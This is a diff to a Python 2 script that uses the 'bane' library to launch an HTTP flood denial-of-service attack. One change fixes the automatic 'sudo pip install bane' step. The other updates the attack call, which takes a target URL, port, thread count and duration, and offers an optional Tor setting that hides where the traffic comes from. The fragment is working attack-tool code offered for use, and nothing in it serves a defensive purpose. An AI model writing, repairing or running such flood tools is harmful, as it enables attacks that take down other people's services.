@@ -4,9 +4,9 @@ try:
 except:
  print"Failed to import a module.\nLet me install it for you.. (if you are using linux you have to execute it as root to install the required module)"
  if os.path.isdir('/home')==True:
-  os.system('sudo pip import bane')
+  os.system('sudo pip install bane')
  else:
-  os.system('pip import bane')
+  os.system('pip install bane')
 import socket
 n=0
 while(n<1):
@@ -50,7 +50,7 @@ to=False
 if tr==1:
  to=True
 try:
- bane.httpflood(u,p=p,maxtime=ti,threads=th,interval=d,level=2,settor=to)
+ bane.http_flood_attack(u,p=p,maxtime=ti,threads=th,duration=d,level=2,settor=to)
 except KeyboardInterrupt:
  bane.ddos.stop=True
 
